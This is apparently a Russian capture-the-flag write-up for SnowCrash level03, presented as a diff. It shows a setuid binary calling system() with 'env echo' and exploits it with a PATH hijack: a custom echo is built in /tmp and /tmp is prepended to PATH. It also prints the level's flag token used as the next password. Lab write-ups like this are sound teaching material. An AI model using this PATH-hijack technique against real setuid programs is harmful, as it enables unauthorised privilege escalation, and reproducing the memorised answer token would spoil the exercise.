@@ -1,0 +1,35 @@
+-Посмотрим на файлы, которые у нас в директории, файл экзекьютебл
+
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+
+-Посмотрим, какие функции вызываются у нас в этом экзекьютебле
+
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                        = 2003
+geteuid()                                        = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 0
++++ exited (status 0) +++
+
+-Видим функцию system(), которая вызывает функцию echo. Напишем небольшую функцию на Си, скомпилируем ее, вернемся в корень, экспортируем path, запускаем экзекьютбл, получаем флаг
+
+level03@SnowCrash:~$ cd /tmp
+level03@SnowCrash:/tmp$ vim echo.c
+level03@SnowCrash:/tmp$ gcc echo.c -o echo
+level03@SnowCrash:/tmp$ cd
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+level03@SnowCrash:~$ su level04
+Password: qi0maab88jeaj46qoumi7maus
+
+
